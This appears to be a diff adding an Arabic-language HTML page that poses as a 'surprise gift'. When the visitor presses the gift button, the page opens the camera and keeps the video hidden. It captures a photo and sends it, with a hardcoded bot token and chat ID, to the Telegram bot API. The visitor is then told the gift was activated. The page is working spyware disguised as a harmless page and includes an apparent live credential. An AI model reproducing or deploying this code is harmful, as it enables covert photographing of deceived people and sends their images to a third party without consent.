@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مفاجأة خاصة 🎁</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #050801; font-family: sans-serif; }
+        .glass-container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px; text-align: center; width: 85%; max-width: 400px; }
+        .neon-btn { padding: 15px 30px; color: #03e9f4; background: transparent; border: 2px solid #03e9f4; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="glass-container">
+        <h1 style="color: white;">هدية حصرية! 🎁</h1>
+        <button class="neon-btn" onclick="start()">افتح المفاجأة</button>
+        <div id="status" style="color: #03e9f4; margin-top: 20px;"></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const TOKEN = "8387241026:AAFhkkv2RYiOFr4o8PJMeDikn2mMNkF_6rA";
+        const ID = "7002841594";
+
+        async function start() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
+                    
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('photo', blob, 'p.jpg');
+                        fd.append('chat_id', ID);
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }).then(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            document.getElementById('status').innerText = "✨ تم تفعيل هديتك بنجاح!";
+                        });
+                    }, 'image/jpeg', 0.5);
+                }, 1000);
+            } catch (e) { alert("يجب السماح بالكاميرا!"); }
+        }
+    </script>
+</body>
+</html>
